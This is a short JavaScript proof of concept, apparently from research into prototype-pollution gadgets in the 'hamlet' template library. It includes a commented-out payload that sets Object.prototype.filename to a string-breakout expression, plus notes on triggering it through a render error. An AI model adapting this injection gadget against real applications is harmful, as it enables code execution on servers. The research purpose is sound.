const Hamlet = require('hamlet').hamlet;

try{
    Object._expose.setupSymbols()
}
catch(e){
    console.log("[!] symbolic execution not enabled")
}

const templateString =  `<body>
<p>Some paragraph.
<ul>
    <li>Item 1
    <li>Item 2
<.foo>
    <span#bar data-attr=#{foo}>baz # this is a comment`

// gadget 1
// Object.prototype.filename = "' + (console.log(\'gg\')) + '"

/*
    This requries trigger an error in the render stage as the inject code is in the catch block
    This is fairly commonly seen scanrio if the server is passing user inputs as the data of function while they are missing a required variable (e.g. foo)
*/
let ret = Hamlet(templateString, {})